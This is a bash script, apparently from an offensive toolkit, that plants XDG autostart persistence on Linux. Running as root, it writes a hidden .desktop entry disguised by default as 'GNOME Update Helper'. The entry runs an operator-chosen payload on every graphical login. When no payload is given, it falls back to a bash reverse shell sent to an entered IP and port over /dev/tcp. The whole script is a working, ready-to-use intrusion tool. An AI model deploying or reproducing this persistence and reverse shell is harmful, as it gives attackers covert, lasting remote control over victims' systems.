#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] XDG Autostart Persistence [*] "
echo ""
echo "This creates a .desktop file that runs your payload on graphical login."
echo ""

read -p "Enter your payload or command (or leave empty for reverse shell): " payload

if [ -z "$payload" ]; then
    read -p "Enter the IP address: " ip
    read -p "Enter the port: " port
    payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
fi

read -p "Enter .desktop filename (default: gnome-update-helper): " desktop_name
desktop_name="${desktop_name:-gnome-update-helper}"

read -p "Enter display name for the entry (default: GNOME Update Helper): " display_name
display_name="${display_name:-GNOME Update Helper}"

mkdir -p /etc/xdg/autostart/

cat > /etc/xdg/autostart/${desktop_name}.desktop <<EOF
[Desktop Entry]
Type=Application
Name=$display_name
Exec=/bin/bash -c '$payload' &
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
X-GNOME-Autostart-Delay=10
EOF

chmod 644 /etc/xdg/autostart/${desktop_name}.desktop

clear

echo "[*] Success!! XDG Autostart persistence implanted. [*]"
echo "[*] File: /etc/xdg/autostart/${desktop_name}.desktop [*]"
echo "[*] Triggers on every graphical user login (GNOME, KDE, XFCE, etc.) [*]"

sleep 1

clear
